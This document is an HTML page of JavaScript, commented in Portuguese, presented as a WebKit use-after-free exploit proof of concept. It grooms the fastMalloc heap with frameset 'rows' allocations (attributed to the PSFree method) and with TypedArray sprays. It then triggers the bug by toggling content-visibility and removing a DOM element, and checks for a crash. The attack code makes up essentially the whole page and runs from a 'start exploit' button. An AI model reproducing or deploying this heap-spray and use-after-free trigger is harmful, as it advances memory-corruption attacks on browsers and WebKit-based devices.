<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit UaF: RenderLayer + FastMalloc Spray</title>
    <style>
        body { font-family: monospace; background-color: #1a1a1a; color: #0f0; padding: 20px; }
        .container { 
            border: 2px dashed #555; 
            padding: 20px; 
            margin-bottom: 20px; 
            background: #333;
        }
        .child { 
            width: 100px; 
            height: 100px; 
            background-color: #007bff; 
            border: 2px solid #0056b3;
        }
        button { 
            padding: 15px 30px; 
            font-size: 18px; 
            cursor: pointer; 
            background-color: #d32f2f; 
            color: white; 
            border: none; 
            font-weight: bold;
            border-radius: 5px;
        }
        button:hover { background-color: #b71c1c; }
        #log-area { 
            margin-top: 20px; 
            border-top: 1px solid #555; 
            padding-top: 10px; 
            white-space: pre-wrap; 
            max-height: 400px;
            overflow-y: auto;
            background: #000;
            padding: 10px;
        }
    </style>
</head>
<body>

    <h2>WebKit UaF: RenderLayer + Frameset Spray (PSFree method)</h2>
    <p>Status: <span id="status">Aguardando in√≠cio...</span></p>
    <button onclick="runExploit()">INICIAR EXPLOIT</button>

    <div class="container">
        <div class="child"></div>
    </div>

    <div id="log-area"><h3>Logs do Sistema:</h3></div>

<script>
/* ==========================================
   UTILS & CONFIG
   ========================================== */
function debug_log(msg) {
    let time = new Date().toLocaleTimeString();
    let logLine = `[${time}] ${msg}`;
    console.log(logLine);
    
    let p = document.createElement("div");
    p.textContent = logLine;
    let logArea = document.getElementById("log-area");
    if(logArea) {
        logArea.appendChild(p);
        logArea.scrollTop = logArea.scrollHeight;
    }
}

/* ==========================================
   HEAP SPRAY TECHNIQUES
   ========================================== */

// Mant√©m refer√™ncias globais para evitar que o Garbage Collector limpe nosso spray
var keep_alive = [];
var frameset_keeper = [];

/**
 * T√©cnica do PSFree: Frameset Spray
 * Usa a propriedade 'rows' de framesets para alocar Strings/Vetores no fastMalloc.
 * √ötil para corromper objetos C++ internos (Vectors, HashMaps).
 */
function sprayFastMalloc(sizeInBytes, count = 1000) {
    // Length (8 bytes) + Length (8 bytes) + header... 
    // A l√≥gica do PSFree √©: const rows = ",".repeat(ssv_len / 8 - 2);
    // Isso cria um UniqueArray<Length> de tamanho espec√≠fico.
    
    // Prote√ß√£o: Tamanho deve ser m√∫ltiplo de 8 e razo√°vel
    if (sizeInBytes < 16 || sizeInBytes % 8 !== 0) return;

    let commaCount = (sizeInBytes / 8) - 2;
    // Cria a string payload (v√≠rgulas for√ßam aloca√ß√£o de array)
    let payload = ",".repeat(Math.floor(commaCount));
    
    debug_log(`‚ö° Spraying fastMalloc: ${count} objs de ${sizeInBytes} bytes...`);

    for(let i = 0; i < count; i++) {
        let f = document.createElement('frameset');
        f.rows = payload; 
        frameset_keeper.push(f); // Previne GC
    }
}

/**
 * T√©cnica Cl√°ssica: TypedArray Spray
 * √ötil para preencher o Heap auxiliar e grandes aloca√ß√µes.
 */
function sprayBigHeap() {
    debug_log("üåä Spraying Big Heap (TypedArrays)...");
    for (let i = 0; i < 5000; i++) {
        let arr = new Uint8Array(0x1000); // 4KB
        arr.fill(0x41); // 'A'
        keep_alive.push(arr);
    }
}

/* ==========================================
   LOGICA DO EXPLOIT (TRIGGER)
   ========================================== */

let container, child;

function initDom() {
    container = document.querySelector(".container");
    child = document.querySelector(".child");
    if(!child) {
        // Reconstr√≥i se foi deletado
        child = document.createElement("div");
        child.className = "child";
        container.appendChild(child);
    }
}

function triggerUAF() {
    initDom();

    // 1. HEAP GROOMING PRELIMINAR
    // Tenta preencher buracos existentes para que nossa pr√≥xima aloca√ß√£o caia onde queremos
    // Alocamos tamanhos variados que s√£o comuns em estruturas de RenderLayer (Vetores de Z-order)
    debug_log("üßπ Executando Heap Grooming...");
    sprayFastMalloc(64, 500);  
    sprayFastMalloc(128, 500);
    sprayFastMalloc(256, 500);

    // 2. O GATILHO DO BUG
    debug_log("üí£ Preparando Trigger (Visibility: Hidden)...");
    container.style.contentVisibility = "hidden";
    
    debug_log("üíÄ Removendo elemento (FREE)...");
    child.remove();
    
    // 3. A CORRIDA (RACE CONDITION)
    // Precisamos ocupar o espa√ßo IMEDIATAMENTE antes do re-uso.
    // Fazemos um spray massivo de v√°rios tamanhos para tentar acertar o bucket do objeto liberado.
    
    debug_log("üöÄ SPRAY INTENSO (Tentando ocupar o espa√ßo livre)...");
    
    // Tenta cobrir os tamanhos mais prov√°veis de vetores internos
    sprayFastMalloc(32, 2000);  // Muito comum para vetores pequenos
    sprayFastMalloc(64, 2000);
    sprayFastMalloc(128, 2000); // Comum para listas m√©dias
    sprayFastMalloc(512, 1000); 
    
    // Tamb√©m roda o spray cl√°ssico por garantia
    sprayBigHeap();

    // 4. O USO (USE)
    setTimeout(() => {
        debug_log("üîÑ For√ßando Recomputa√ß√£o (Visibility: Auto)...");
        container.style.contentVisibility = "auto";
        
        // 5. VERIFICA√á√ÉO DE CRASH
        debug_log("üïµÔ∏è Verificando integridade da mem√≥ria...");
        try {
            // Se o objeto 'child' (ou sua estrutura interna) foi corrompido e substitu√≠do
            // pelo nosso spray (que √© cheio de 0x41 ou dados de frameset),
            // acessar propriedades geom√©tricas deve causar um CRASH pois os ponteiros s√£o inv√°lidos.
            
            let rect = child.getBoundingClientRect(); // For√ßa update de layout
            let w = rect.width;
            
            debug_log("‚ùå NENHUM CRASH DETECTADO.");
            debug_log(`Info: Browser leu largura ${w}. O objeto foi limpo corretamente ou erramos o 'buraco'.`);
            document.getElementById("status").innerText = "Falha: Sem Crash. Tente recarregar.";
            
        } catch(e) {
            debug_log("‚ö†Ô∏è Erro JS: " + e.message);
        }
    }, 0);
}

// Observer para persist√™ncia (opcional, pode ser desativado se causar loop infinito)
const observer = new MutationObserver((mutations) => {
    // L√≥gica para detectar se o child sumiu e tentar sprayar novamente
    // Desativado por padr√£o para evitar travamento da UI antes do exploit
});

function runExploit() {
    document.getElementById("status").innerText = "Rodando...";
    // Limpa arrays antigos para n√£o estourar a RAM antes da hora
    keep_alive = [];
    frameset_keeper = [];
    
    triggerUAF();
}

</script>
</body>
</html>
